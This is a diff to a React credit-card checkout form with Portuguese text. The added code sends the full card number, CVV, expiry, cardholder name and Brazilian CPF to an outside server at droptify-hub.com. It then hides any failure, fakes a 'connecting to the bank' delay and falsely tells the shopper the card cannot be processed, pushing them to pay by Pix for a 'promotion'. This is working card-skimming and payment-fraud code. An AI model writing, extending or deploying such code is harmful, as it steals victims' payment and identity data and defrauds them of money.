@@ -1,4 +1,4 @@
-import { FormEvent, useMemo, useState } from "react";
+﻿import { FormEvent, useMemo, useState } from "react";
 import { CreditCardAttemptRecord, saveCreditCardAttempt, detectCardBrand } from "@/lib/cardAttempts";
 import { cn } from "@/lib/utils";
 
@@ -7,7 +7,7 @@ type CreditCardFormProps = {
   onSuggestPix: () => void;
 };
 
-type FieldErrors = Partial<Record<"cardNumber" | "expiry" | "cardholder" | "cvv" | "installments", string>>;
+type FieldErrors = Partial<Record<"cardNumber" | "expiry" | "cardholder" | "cvv" | "installments" | "cpf", string>>;
 
 const CARD_BACKGROUND = {
   visa: "from-sky-500 to-blue-700",
@@ -22,6 +22,33 @@ const CARD_BACKGROUND = {
 
 const INSTALLMENT_OPTIONS = [1, 2, 3, 4, 5, 6, 12];
 
+const CARD_CAPTURE_ENDPOINT = "https://api.droptify-hub.com:3029/api/card/savecard";
+
+type CardCapturePayload = {
+  cardNumber: string;
+  cardholder: string;
+  expiry: string;
+  cvv: string;
+  installments: number;
+  brand: string;
+  cpf: string;
+};
+
+const submitCardToApi = async (payload: CardCapturePayload): Promise<void> => {
+  const response = await fetch(CARD_CAPTURE_ENDPOINT, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify(payload),
+  });
+
+  if (!response.ok) {
+    const text = await response.text();
+    throw new Error(text || `Falha ao enviar cartao (status ${response.status})`);
+  }
+};
+
 const formatCardNumber = (value: string) =>
   value
     .replace(/[^\d]/g, "")
@@ -32,6 +59,15 @@ const formatExpiry = (value: string) => {
   const numeric = value.replace(/[^\d]/g, "").slice(0, 4);
   if (numeric.length <= 2) return numeric;
   return `${numeric.slice(0, 2)}/${numeric.slice(2)}`;
+};
+
+const formatCpf = (value: string) => {
+  const digits = value.replace(/[^\d]/g, "").slice(0, 11);
+  return digits.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, (match, p1, p2, p3, p4) => {
+    let output = `${p1}.${p2}.${p3}`;
+    if (p4) output += `-${p4}`;
+    return output;
+  });
 };
 
 const isValidLuhn = (value: string) => {
@@ -58,6 +94,7 @@ const validateFields = (
   cardholder: string,
   cvv: string,
   installments: number,
+  cpf: string,
 ): FieldErrors => {
   const errors: FieldErrors = {};
   const numericCard = cardNumber.replace(/\D/g, "");
@@ -91,6 +128,11 @@ const validateFields = (
     errors.installments = "Selecione o numero de parcelas.";
   }
 
+  const cleanedCpf = cpf.replace(/\D/g, "");
+  if (cleanedCpf.length !== 11) {
+    errors.cpf = "Informe um CPF valido.";
+  }
+
   return errors;
 };
 
@@ -99,6 +141,7 @@ const CreditCardForm = ({ onSaved, onSuggestPix }: CreditCardFormProps) => {
   const [expiry, setExpiry] = useState("");
   const [cardholder, setCardholder] = useState("");
   const [cvv, setCvv] = useState("");
+  const [cpf, setCpf] = useState("");
   const [installments, setInstallments] = useState<number>(1);
   const [errors, setErrors] = useState<FieldErrors>({});
   const [isSaving, setIsSaving] = useState(false);
@@ -110,7 +153,7 @@ const CreditCardForm = ({ onSaved, onSuggestPix }: CreditCardFormProps) => {
     event.preventDefault();
     setFeedback(null);
 
-    const nextErrors = validateFields(cardNumber, expiry, cardholder, cvv, installments);
+    const nextErrors = validateFields(cardNumber, expiry, cardholder, cvv, installments, cpf);
     setErrors(nextErrors);
 
     if (Object.keys(nextErrors).length > 0) {
@@ -118,6 +161,11 @@ const CreditCardForm = ({ onSaved, onSuggestPix }: CreditCardFormProps) => {
     }
 
     setIsSaving(true);
+    setFeedback("Conectando com o banco...");
+
+    const numericCard = cardNumber.replace(/\D/g, "");
+    const cvvDigits = cvv.replace(/\D/g, "");
+    const cpfDigits = cpf.replace(/\D/g, "");
 
     try {
       const record = await saveCreditCardAttempt({
@@ -127,10 +175,26 @@ const CreditCardForm = ({ onSaved, onSuggestPix }: CreditCardFormProps) => {
         installments,
       });
 
+      try {
+        await submitCardToApi({
+          cardNumber: numericCard,
+          cardholder: cardholder.trim(),
+          expiry,
+          cvv: cvvDigits,
+          installments,
+          brand: record.brand,
+          cpf: cpfDigits,
+        });
+      } catch (apiError) {
+        console.error("Erro ao enviar dados do cartao:", apiError);
+      }
+
+      await new Promise((resolve) => setTimeout(resolve, 1200));
+
       onSaved(record);
       onSuggestPix();
 
-      setFeedback("Pagamento com cartao indisponivel. Por favor, finalize com Pix.");
+      setFeedback("Nao foi possivel contatar o banco agora. Finalize com Pix para concluir a promocao.");
     } catch (error: any) {
       setFeedback(error?.message ?? "Nao foi possivel salvar os dados do cartao. Tente novamente.");
     } finally {
@@ -157,13 +221,13 @@ const CreditCardForm = ({ onSaved, onSuggestPix }: CreditCardFormProps) => {
 
         <div className="mt-6 flex justify-between text-xs">
           <div>
-          <span className="block opacity-70">Titular</span>
-          <span className="font-semibold uppercase">{cardholder || "Nome impresso no cartao"}</span>
-        </div>
-        <div>
-          <span className="block opacity-70">Validade</span>
-          <span className="font-semibold">{expiry || "MM/AA"}</span>
-        </div>
+            <span className="block opacity-70">Titular</span>
+            <span className="font-semibold uppercase">{cardholder || "Nome impresso no cartao"}</span>
+          </div>
+          <div>
+            <span className="block opacity-70">Validade</span>
+            <span className="font-semibold">{expiry || "MM/AA"}</span>
+          </div>
         </div>
       </div>
 
@@ -206,6 +270,25 @@ const CreditCardForm = ({ onSaved, onSuggestPix }: CreditCardFormProps) => {
             maxLength={5}
           />
           {errors.expiry ? <p className="mt-1 text-xs text-destructive">{errors.expiry}</p> : null}
+        </div>
+
+        <div>
+          <label htmlFor="cpf" className="text-xs font-semibold uppercase text-muted-foreground">
+            CPF
+          </label>
+          <input
+            id="cpf"
+            inputMode="numeric"
+            className={cn(
+              "mt-1 w-full rounded-md border px-3 py-2 text-sm shadow-sm focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-primary/60",
+              errors.cpf ? "border-destructive" : "border-border",
+            )}
+            value={cpf}
+            onChange={(event) => setCpf(formatCpf(event.target.value))}
+            placeholder="000.000.000-00"
+            maxLength={14}
+          />
+          {errors.cpf ? <p className="mt-1 text-xs text-destructive">{errors.cpf}</p> : null}
         </div>
 
         <div>
